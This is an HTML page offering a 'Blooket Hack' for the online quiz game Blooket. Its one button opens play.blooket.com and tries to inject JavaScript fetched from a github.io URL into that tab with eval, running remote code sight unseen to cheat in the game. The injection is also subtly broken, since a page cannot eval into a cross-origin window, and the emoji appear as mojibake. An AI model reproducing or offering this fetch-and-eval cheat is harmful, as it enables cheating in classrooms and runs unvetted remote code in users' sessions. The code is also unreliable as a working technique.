<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blooket Hack</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: white;
            margin-top: 50px;
        }
        h1 {
            font-size: 28px;
        }
        button {
            background-color: #28a745;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #218838;
        }
        .container {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üöÄ Blooket Hack</h1>
        <p>Click the button below to open Blooket and run the hack.</p>
        <button onclick="runHack()">üöÄ Run Hack</button>
    </div>

    <script>
        function runHack() {
            let blooketTab = window.open("https://play.blooket.com", "_blank");
            
            if (blooketTab) {
                setTimeout(() => {
                    blooketTab.eval(`
                        fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                        .then(response => response.text())
                        .then(eval)
                        .catch(error => alert('‚ùå Hack failed: ' + error));
                    `);
                }, 3000);
                alert("‚úÖ Blooket opened. Hack will run in a few seconds.");
            } else {
                alert("‚ùå Pop-ups are blocked! Allow pop-ups and try again.");
            }
        }
    </script>

</body>
</html>
